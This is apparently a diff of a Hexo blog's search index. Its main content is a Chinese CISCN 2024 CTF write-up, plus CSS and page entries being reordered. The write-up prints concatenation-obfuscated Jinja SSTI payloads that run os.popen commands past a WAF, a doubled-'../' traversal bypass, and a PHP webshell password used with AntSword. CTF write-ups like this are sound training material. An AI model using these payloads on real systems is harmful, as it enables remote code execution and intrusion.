@@ -8,7 +8,7 @@
       <link href="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/"/>
       <url>/2024/12/15/CISCN-%E9%93%81%E4%B8%89/</url>
       
-        <content type="html"><![CDATA[<h1 id="Safe-proxy"><a href="#Safe-proxy" class="headerlink" title="Safe_proxy"></a>Safe_proxy</h1><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-113314015.png" class="">  <p>看源码可以发现器/路由存在ssti，并且为无回显的ssti。这时有两个思路，内存马或者打回显。我这里打算打500报错回显比较方便<br>打内存马相对要绕的会比较多<br><a href="https://lisien11.xyz/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/">python flask 新型回显的学习和进一步的深入</a></p><p>因为waf禁了__，popen sys os等我这里选择拼接绕过</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;&#123;url_for[<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_globals_&quot;</span>+<span class="string">&quot;_&quot;</span>][<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_builtins_&quot;</span>+<span class="string">&quot;_&quot;</span>][<span class="string">&#x27;setattr&#x27;</span>](((lipsum[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_spec_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>]|attr(<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_init_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>)|attr(<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_globals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>))[<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ys&#x27;</span>]|attr(<span class="string">&#x27;modules&#x27;</span>))[<span class="string">&#x27;werkzeug&#x27;</span>]|attr(<span class="string">&#x27;exceptions&#x27;</span>)|attr(<span class="string">&#x27;InternalServerError&#x27;</span>),<span class="string">&quot;description&quot;</span>,url_for[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_globals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_buil&#x27;</span>+<span class="string">&#x27;tins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_im&#x27;</span>+<span class="string">&#x27;port_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read())&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;&#123;url_for[<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_globals_&quot;</span>+<span class="string">&quot;_&quot;</span>][<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_buil&quot;</span>+<span class="string">&quot;tins_&quot;</span>+<span class="string">&quot;_&quot;</span>][<span class="string">&#x27;setattr&#x27;</span>](cycler[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_init_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_globals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_builtins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_imp&#x27;</span>+<span class="string">&#x27;ort_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>](<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ys&#x27;</span>)[<span class="string">&#x27;modules&#x27;</span>][<span class="string">&#x27;werkzeug&#x27;</span>][<span class="string">&#x27;exceptions&#x27;</span>][<span class="string">&#x27;InternalServerError&#x27;</span>],<span class="string">&#x27;description&#x27;</span>,cycler[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_init_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_globals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_builtins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_im&#x27;</span>+<span class="string">&#x27;port_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)[<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]())&#125;&#125;</span><br></pre></td></tr></table></figure><p>也可以这么拼建议用第二种比较方便</p><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-113756834.png" class="">  <p>如何多输几个<code>&#123;&#123;&#125;&#125;</code>使其报错<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-113811890.png" class="">  </p><h1 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h1><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114031142.png" class="">  <p>看源码可以发现../hackme.php和../tips.php两个文件，尝试读取<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114053587.png" class=""><br>直接读取会和我们说不在这里，经过尝试不管输入多少../起都是回显不在这里，且不触发其13字符的长度限制，猜测../是被删除的<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114130457.png" class=""><br>经过尝试其可以双写绕过<br>…/./hackme.php<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114238141.png" class=""><br>可以发现其为一个混淆过的代码<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114456965.png" class=""><br>可以用echo一层一层输出<br>可以发现其是一个php的马，密码为cmd<em>66.99<br>因为点不能传所有将</em>改为<code>[</code>使后面的.不会被自动转为_。<br>所有我们蚁剑的连接密码为<code>cmd[66.99</code></p><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114624797.png" class="">  <p>用插件直接绕过</p><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114647920.png" class="">  <p>全局搜索flag可以找到flag文件</p>]]></content>
+        <content type="html"><![CDATA[<h1 id="国内网安实在是太强辣，最后10分钟直接掉一百来名捏😠"><a href="#国内网安实在是太强辣，最后10分钟直接掉一百来名捏😠" class="headerlink" title="国内网安实在是太强辣，最后10分钟直接掉一百来名捏😠"></a>国内网安实在是太强辣，最后10分钟直接掉一百来名捏😠</h1><h1 id="Safe-proxy"><a href="#Safe-proxy" class="headerlink" title="Safe_proxy"></a>Safe_proxy</h1><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-113314015.png" class="">  <p>看源码可以发现器/路由存在ssti，并且为无回显的ssti。这时有两个思路，内存马或者打回显。我这里打算打500报错回显比较方便<br>打内存马相对要绕的会比较多<br><a href="https://lisien11.xyz/2024/11/19/python-flask-%E6%96%B0%E5%9E%8B%E5%9B%9E%E6%98%BE%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5/">python flask 新型回显的学习和进一步的深入</a></p><p>因为waf禁了__，popen sys os等我这里选择拼接绕过</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;&#123;url_for[<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_globals_&quot;</span>+<span class="string">&quot;_&quot;</span>][<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_builtins_&quot;</span>+<span class="string">&quot;_&quot;</span>][<span class="string">&#x27;setattr&#x27;</span>](((lipsum[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_spec_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>]|attr(<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_init_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>)|attr(<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_globals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>))[<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ys&#x27;</span>]|attr(<span class="string">&#x27;modules&#x27;</span>))[<span class="string">&#x27;werkzeug&#x27;</span>]|attr(<span class="string">&#x27;exceptions&#x27;</span>)|attr(<span class="string">&#x27;InternalServerError&#x27;</span>),<span class="string">&quot;description&quot;</span>,url_for[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_globals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_buil&#x27;</span>+<span class="string">&#x27;tins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_im&#x27;</span>+<span class="string">&#x27;port_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;cat /flag&#x27;</span>).read())&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&#123;&#123;url_for[<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_globals_&quot;</span>+<span class="string">&quot;_&quot;</span>][<span class="string">&quot;_&quot;</span>+<span class="string">&quot;_buil&quot;</span>+<span class="string">&quot;tins_&quot;</span>+<span class="string">&quot;_&quot;</span>][<span class="string">&#x27;setattr&#x27;</span>](cycler[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_init_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_globals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_builtins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_imp&#x27;</span>+<span class="string">&#x27;ort_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>](<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ys&#x27;</span>)[<span class="string">&#x27;modules&#x27;</span>][<span class="string">&#x27;werkzeug&#x27;</span>][<span class="string">&#x27;exceptions&#x27;</span>][<span class="string">&#x27;InternalServerError&#x27;</span>],<span class="string">&#x27;description&#x27;</span>,cycler[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_init_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_globals_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_builtins_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_im&#x27;</span>+<span class="string">&#x27;port_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)[<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]())&#125;&#125;</span><br></pre></td></tr></table></figure><p>也可以这么拼建议用第二种比较方便</p><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-113756834.png" class="">  <p>如何多输几个<code>&#123;&#123;&#125;&#125;</code>使其报错<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-113811890.png" class="">  </p><h1 id="hello-web"><a href="#hello-web" class="headerlink" title="hello_web"></a>hello_web</h1><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114031142.png" class="">  <p>看源码可以发现../hackme.php和../tips.php两个文件，尝试读取<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114053587.png" class=""><br>直接读取会和我们说不在这里，经过尝试不管输入多少../起都是回显不在这里，且不触发其13字符的长度限制，猜测../是被删除的<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114130457.png" class=""><br>经过尝试其可以双写绕过<br>…/./hackme.php<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114238141.png" class=""><br>可以发现其为一个混淆过的代码<br><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114456965.png" class=""><br>可以用echo一层一层输出<br>可以发现其是一个php的马，密码为cmd<em>66.99<br>因为点不能传所有将</em>改为<code>[</code>使后面的.不会被自动转为_。<br>所有我们蚁剑的连接密码为<code>cmd[66.99</code></p><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114624797.png" class="">  <p>用插件直接绕过</p><img src="/2024/12/15/CISCN-%E9%93%81%E4%B8%89/IMG_20241216-114647920.png" class="">  <p>全局搜索flag可以找到flag文件</p>]]></content>
       
       
       
@@ -2526,6 +2526,17 @@
     
     <entry>
       <title></title>
+      <link href="/baidu_verify_codeva-t6Y9fshzlA.html"/>
+      <url>/baidu_verify_codeva-t6Y9fshzlA.html</url>
+      
+        <content type="html"><![CDATA[52a533e3b2aa22f3ce0859497b2589eb]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
       <link href="/baidu_verify_codeva-tWN8KDrfR6.html"/>
       <url>/baidu_verify_codeva-tWN8KDrfR6.html</url>
       
@@ -2537,21 +2548,10 @@
     
     <entry>
       <title></title>
-      <link href="/baidu_verify_codeva-t6Y9fshzlA.html"/>
-      <url>/baidu_verify_codeva-t6Y9fshzlA.html</url>
+      <link href="/css/modify.css"/>
+      <url>/css/modify.css</url>
       
-        <content type="html"><![CDATA[52a533e3b2aa22f3ce0859497b2589eb]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>友情链接</title>
-      <link href="/link/index.html"/>
-      <url>/link/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[#page-header {  background: transparent !important;}#page-header.post-bg,#page-header.not-home-page {  height: 280px !important;}#page-header #post-info {  bottom: 40px !important;  text-align: center;}#page-header #page-site-info {  top: 140px !important;}@media screen and (max-width: 768px) {  #page-header.not-home-page {    height: 200px !important;  }  #page-header #post-info {    bottom: 10px !important;  }  #page-header #page-site-info {    top: 100px !important;  }}.top-img {  height: 250px;  margin: -50px -40px 50px;  border-top-left-radius: inherit;  border-top-right-radius: inherit;  background-position: center center;  background-size: cover;  -webkit-transition: all 0.3s;  -moz-transition: all 0.3s;  -o-transition: all 0.3s;  -ms-transition: all 0.3s;  transition: all 0.3s;}@media screen and (max-width: 768px) {  .top-img {    height: 230px;    margin: -36px -14px 36px;  }}[data-theme='dark'] .top-img {  filter: brightness(0.8);}#footer:before {  background-color: rgba(255,255,255,0.5);}[data-theme='dark'] #footer:before {  background-color: rgba(0,0,0,0.5);}#footer-wrap,#footer-wrap a {  color: #111;  -webkit-transition: unset;  -moz-transition: unset;  -o-transition: unset;  -ms-transition: unset;  transition: unset;}[data-theme='dark'] #footer-wrap,[data-theme='dark'] #footer-wrap a {  color: var(--light-grey);}]]></content>
       
     </entry>
     
@@ -2570,10 +2570,10 @@
     
     <entry>
       <title></title>
-      <link href="/css/modify.css"/>
-      <url>/css/modify.css</url>
+      <link href="/css/transpancy.css"/>
+      <url>/css/transpancy.css</url>
       
-        <content type="html"><![CDATA[#page-header {  background: transparent !important;}#page-header.post-bg,#page-header.not-home-page {  height: 280px !important;}#page-header #post-info {  bottom: 40px !important;  text-align: center;}#page-header #page-site-info {  top: 140px !important;}@media screen and (max-width: 768px) {  #page-header.not-home-page {    height: 200px !important;  }  #page-header #post-info {    bottom: 10px !important;  }  #page-header #page-site-info {    top: 100px !important;  }}.top-img {  height: 250px;  margin: -50px -40px 50px;  border-top-left-radius: inherit;  border-top-right-radius: inherit;  background-position: center center;  background-size: cover;  -webkit-transition: all 0.3s;  -moz-transition: all 0.3s;  -o-transition: all 0.3s;  -ms-transition: all 0.3s;  transition: all 0.3s;}@media screen and (max-width: 768px) {  .top-img {    height: 230px;    margin: -36px -14px 36px;  }}[data-theme='dark'] .top-img {  filter: brightness(0.8);}#footer:before {  background-color: rgba(255,255,255,0.5);}[data-theme='dark'] #footer:before {  background-color: rgba(0,0,0,0.5);}#footer-wrap,#footer-wrap a {  color: #111;  -webkit-transition: unset;  -moz-transition: unset;  -o-transition: unset;  -ms-transition: unset;  transition: unset;}[data-theme='dark'] #footer-wrap,[data-theme='dark'] #footer-wrap a {  color: var(--light-grey);}]]></content>
+        <content type="html"><![CDATA[/* 文章页背景 */.layout_post>#post {    /* 以下代表透明度为0.7 可以自行修改*/    background: rgba(255,255,255,.8);} /* 所有页面背景 */#aside_content .card-widget, #recent-posts>.recent-post-item, .layout_page>div:first-child:not(.recent-posts), .layout_post>#page, .layout_post>#post, .read-mode .layout_post>#post{    /* 以下代表透明度为0.7 */    background: rgba(255,255,255,.8);}/*侧边卡片的透明度 */:root {  --card-bg: rgba(255, 255, 255, .8);}/* 页脚透明 */#footer {/* 以下代表透明度为0.7 */background: rgba(255,255,255, .0);}]]></content>
       
     </entry>
     
@@ -2583,6 +2583,17 @@
       <title>这就是（一个平平无奇的大学生的）分类</title>
       <link href="/categories/index.html"/>
       <url>/categories/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title></title>
+      <link href="/css/LSE.css"/>
+      <url>/css/LSE.css</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -2603,17 +2614,6 @@
     
     <entry>
       <title></title>
-      <link href="/css/transpancy.css"/>
-      <url>/css/transpancy.css</url>
-      
-        <content type="html"><![CDATA[/* 文章页背景 */.layout_post>#post {    /* 以下代表透明度为0.7 可以自行修改*/    background: rgba(255,255,255,.8);} /* 所有页面背景 */#aside_content .card-widget, #recent-posts>.recent-post-item, .layout_page>div:first-child:not(.recent-posts), .layout_post>#page, .layout_post>#post, .read-mode .layout_post>#post{    /* 以下代表透明度为0.7 */    background: rgba(255,255,255,.8);}/*侧边卡片的透明度 */:root {  --card-bg: rgba(255, 255, 255, .8);}/* 页脚透明 */#footer {/* 以下代表透明度为0.7 */background: rgba(255,255,255, .0);}]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
       <link href="/scripts/modify.js"/>
       <url>/scripts/modify.js</url>
       
@@ -2624,9 +2624,9 @@
     
     
     <entry>
-      <title>一个普通大学生的标签页</title>
-      <link href="/tag/index.html"/>
-      <url>/tag/index.html</url>
+      <title>友情链接</title>
+      <link href="/link/index.html"/>
+      <url>/link/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -2635,9 +2635,9 @@
     
     
     <entry>
-      <title></title>
-      <link href="/css/LSE.css"/>
-      <url>/css/LSE.css</url>
+      <title>一个普通大学生的标签页</title>
+      <link href="/tag/index.html"/>
+      <url>/tag/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
